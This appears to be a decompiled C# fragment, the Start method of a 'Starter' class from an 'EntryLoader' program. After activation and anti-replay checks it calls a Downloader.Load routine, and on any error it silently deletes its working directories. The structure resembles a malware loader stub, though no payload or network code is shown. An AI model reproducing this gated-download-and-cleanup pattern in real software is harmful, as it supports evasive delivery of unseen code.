using System;
using System.IO;
using System.Windows.Forms;
using EntryLoader;

// Token: 0x02000017 RID: 23
internal partial class Starter : Form
{
	// Token: 0x06000038 RID: 56 RVA: 0x00004E5C File Offset: 0x0000305C
	public void Start()
	{
		try
		{
			global::Buffer.Start();
			HandlerParams.Start();
			if (!AntiReplaySender.CheckReplayStart() && EntryPoint.activation && new XS().Start(Starter.Params))
			{
				Downloader.Load();
				EntryPoint.close = true;
				return;
			}
		}
		catch
		{
			try
			{
				if (Directory.Exists(global::Buffer.path_l))
				{
					Directory.Delete(global::Buffer.path_l, true);
				}
				if (Directory.Exists(global::Buffer.path_p))
				{
					Directory.Delete(global::Buffer.path_p, true);
				}
			}
			catch
			{
			}
		}
		EntryPoint.close = true;
	}

	// Token: 0x04000014 RID: 20
	public static string FileData;

	// Token: 0x04000015 RID: 21
	public static string[] Params;
}
